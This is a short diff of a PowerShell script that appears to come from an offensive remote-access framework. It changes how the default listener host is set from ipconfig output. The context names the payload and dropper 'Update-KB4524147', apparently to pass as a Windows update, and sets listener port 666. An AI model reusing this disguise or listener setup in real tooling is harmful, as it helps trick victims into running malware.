@@ -213,7 +213,6 @@ $Settings = "Settings.txt";
 $payload_name = "Update-KB4524147";
 $Dropper_Name = "Update-KB4524147";
 $Conf_File = "$IPATH$Settings";
-$localIpAddress=((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
 If([System.IO.File]::Exists($Conf_File))
 {
   ## Read Settings From Venom Settings.txt File..
@@ -236,7 +235,7 @@ If([System.IO.File]::Exists($Conf_File))
 }
 ## Default settings
 If(-not($Local_Port)){$Local_Port = "666"};
-If(-not($Local_Host)){$Local_Host = $localIpAddress};
+If(-not($Local_Host)){$Local_Host = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]};
 ## End Of venom Function ..
 
 
